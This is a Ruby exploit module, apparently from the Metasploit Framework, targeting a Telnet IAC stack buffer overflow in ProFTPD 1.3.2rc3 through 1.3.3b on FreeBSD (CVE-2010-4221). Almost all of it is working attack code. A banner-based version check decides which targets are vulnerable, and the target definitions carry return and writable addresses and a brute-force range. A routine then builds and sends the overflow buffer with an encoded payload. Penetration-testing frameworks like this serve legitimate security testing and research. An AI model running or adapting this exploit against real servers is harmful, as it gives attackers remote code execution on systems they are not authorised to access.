##
# $Id: proftp_telnet_iac.rb 11208 2010-12-02 21:10:03Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Ftp
	include Msf::Exploit::Brute

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in versions of ProFTPD
				server between versions 1.3.2rc3 and 1.3.3b. By sending data containing a
				large number of Telnet IAC commands, an attacker can corrupt memory and
				execute arbitrary code.
			},
			'Author'         => [ 'jduck' ],
			'Version'        => '$Revision: 11208 $',
			'References'     =>
				[
					['CVE', '2010-4221'],
					['OSVDB', '68985'],
					['BID', '44562']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'PrependChrootBreak' => true
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					# NOTE: \xff's need to be doubled (per ftp/telnet stuff)
					'BadChars' => "\x00\x0a\x0d",
					'PrependEncoder' => "\x83\xec\x7f", # sub esp,0x7f (fix esp)
				},
			'Platform'       => [ 'bsd' ],
			'Targets'        =>
			[
				#
				# Automatic targeting via fingerprinting
				#
				[ 'Automatic Targeting', { 'auto' => true }  ],

				#
				# This special one comes first since we dont want its index changing.
				#
				[	'Debug',
					{
						'IACCount' => 8192, # should cause crash writing off end of stack
						'Offset' => 0,
						'Ret' => 0x41414242,
						'Writable' => 0x43434545
					}
				],

				#
				# specific targets
				#
				[ 'ProFTPD 1.3.2a Server (FreeBSD 8.0)',
					{
						'IACCount' => 1024,
						'Offset' => 0x414,
						#'Ret' => 0xbfbfeac4,
						'Writable' => 0x80e64a4,
						'Bruteforce'   =>
							{
								'Start' => { 'Ret' => 0xbfbffdfc },
								'Stop'  => { 'Ret' => 0xbfa00000 },
								'Step'  => 512
							}
					}
				],

			],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 1 2010'))

		register_options(
			[
				Opt::RPORT(21),
			], self.class )
	end


	def check
		# NOTE: We don't care if the login failed here...
		ret = connect

		# We just want the banner to check against our targets..
		print_status("FTP Banner: #{banner.strip}")

		status = CheckCode::Safe
		if banner =~ /ProFTPD (1\.3\.[23][^ ])/i
			ver = $1
			maj,min,rel = ver.split('.')
			relv = rel.slice!(0,1)
			case relv
			when '2'
				if rel.length > 0
					if rel[0,2] == 'rc'
						if rel[2,rel.length].to_i >= 3
							status = CheckCode::Vulnerable
						end
					else
						status = CheckCode::Vulnerable
					end
				end
			when '3'
				# 1.3.3+ defaults to vulnerable (until >= 1.3.3c)
				status = CheckCode::Vulnerable
				if rel.length > 0
					if rel[0,2] != 'rc' and rel[0,1] > 'b'
						status = CheckCode::Safe
					end
				end
			end
		end

		disconnect
		return status
	end

	def target
		return @mytarget if @mytarget
		super
	end

	def exploit
		connect

		# Use a copy of the target
		@mytarget = target

		if (target['auto'])
			@mytarget = nil

			print_status("Automatically detecting the target...")
			if (banner and (m = banner.match(/ProFTPD (1\.3\.[23][^ ]) Server/i))) then
				print_status("FTP Banner: #{banner.strip}")
				version = m[1]
			else
				raise RuntimeError, "No matching target"
			end

			regexp = Regexp.escape(version)
			self.targets.each do |t|
				if (t.name =~ /#{regexp}/) then
					@mytarget = t
					break
				end
			end

			if (not @mytarget)
				raise RuntimeError, "No matching target"
			end

			print_status("Selected Target: #{@mytarget.name}")

			pl = exploit_regenerate_payload(@mytarget.platform, arch)
			if not pl
				raise RuntimeError, 'Unable to regenerate payload!'
			end
		else
			print_status("Trying target #{@mytarget.name}...")
			if banner
				print_status("FTP Banner: #{banner.strip}")
			end

			pl = payload
		end
		disconnect

		super
	end

	def brute_exploit(addrs)
		@mytarget ||= target

		ret = addrs['Ret']
		print_status("Trying return address 0x%.8x..." % ret)

		#puts "attach and press any key"; bleh = $stdin.gets

		buf = ''
		buf << 'SITE '
		# NOTE: buf must be odd-lengthed prior to here.
		buf << "\xff" * @mytarget['IACCount']
		buf << rand_text_alphanumeric(@mytarget['Offset'] - buf.length)
		buf << [
			ret,
			@mytarget['Writable']
		].pack('V*')
		buf << payload.encoded
		buf << "\r\n"

		connect
		sock.put(buf)
		disconnect

		handler
	end

end
